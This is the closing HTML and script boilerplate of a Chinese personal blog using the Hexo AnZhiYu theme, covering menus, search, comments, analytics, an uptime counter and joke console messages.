anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("10/16/2024 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2024 By 安知鱼 V1.6.14",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Shalom 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script async="async">(function () {
  var grt = new Date("10/16/2024 00:00:00"); //设置网站上线时间
  var now = new Date();
  var dnum;
  var hnum;
  var mnum;
  var snum;
  var nowHour;

  // 计算并更新天数、小时数、分钟数和秒数
  function updateTime() {
    now = new Date(); // 更新 now 的值
    nowHour = now.getHours(); // 更新 nowHour 的值
    var days = (now - grt) / 1000 / 60 / 60 / 24;
    dnum = Math.floor(days);
    var hours = (now - grt) / 1000 / 60 / 60 - 24 * dnum;
    hnum = Math.floor(hours);
    if (String(hnum).length == 1) {
      hnum = "0" + hnum;
    }
    var minutes = (now - grt) / 1000 / 60 - 24 * 60 * dnum - 60 * hnum;
    mnum = Math.floor(minutes);
    if (String(mnum).length == 1) {
      mnum = "0" + mnum;
    }
    var seconds = (now - grt) / 1000 - 24 * 60 * 60 * dnum - 60 * 60 * hnum - 60 * mnum;
    snum = Math.round(seconds);
    if (String(snum).length == 1) {
      snum = "0" + snum;
    }
  }

  // 更新网页中显示的网站运行时间
  function updateHtml() {
    const footer = document.getElementById("footer");
    if (!footer) return
    let currentTimeHtml = "";
    if (nowHour < 18 && nowHour >= 9) {
      // 如果是上班时间，默认就是"安知鱼-上班摸鱼中.svg"图片，不需要更改
      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    } else {
      // 如果是下班时间，插入"安知鱼-下班啦.svg"图片
      let img = document.querySelector("#workboard .workSituationImg");
      if (img != null) {
        img.src = "";
        img.title = "";
        img.alt = "";
      }

      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    }

    if (document.getElementById("runtimeTextTip")) {
      document.getElementById("runtimeTextTip").innerHTML = currentTimeHtml;
    }
  }

  setInterval(() => {
    updateTime();
    updateHtml();
  }, 1000);
})();</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://twikoo-vercel.shalom86014.eu.org/',
      region: '',
      onCommentLoaded: () => {
        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') setTimeout(runFn,0)
    else getScript('https://cdn.cbd.int/twikoo@1.6.39/dist/twikoo.all.min.js').then(runFn)
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://twikoo-vercel.shalom86014.eu.org/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const runFn = () => {
    init();
    GLOBAL_CONFIG_SITE.isPost && getCount()
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else {
      loadTwikoo()
    }
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getComment = () => {
    const runTwikoo = () => {
      twikoo.getRecentComments({
        envId: 'https://twikoo-vercel.shalom86014.eu.org/',
        region: '',
        pageSize: 6,
        includeReply: true
      }).then(function (res) {
        const twikooArray = res.map(e => {
          return {
            'content': changeContent(e.comment),
            'avatar': e.avatar,
            'nick': e.nick,
            'url': e.url + '#' + e.id,
            'date': new Date(e.created).toISOString()
          }
        })

        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
        generateHtml(twikooArray)
      }).catch(function (err) {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      })
    }

    if (typeof twikoo === 'object') {
      runTwikoo()
    } else {
      getScript('https://cdn.cbd.int/twikoo@1.6.39/dist/twikoo.all.min.js').then(runTwikoo)
    }
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
        }
        
        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('twikoo-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script id="click-show-text" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="true" data-text="仁爱,Love,喜乐,Joy,和平,Peace,忍耐,Longsuffering,恩慈,Gentleness,良善,Goodness,信实,Faith,温柔,Meekness,节制,Temperance" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: true,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', 'G-TECSCZ4DMP', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>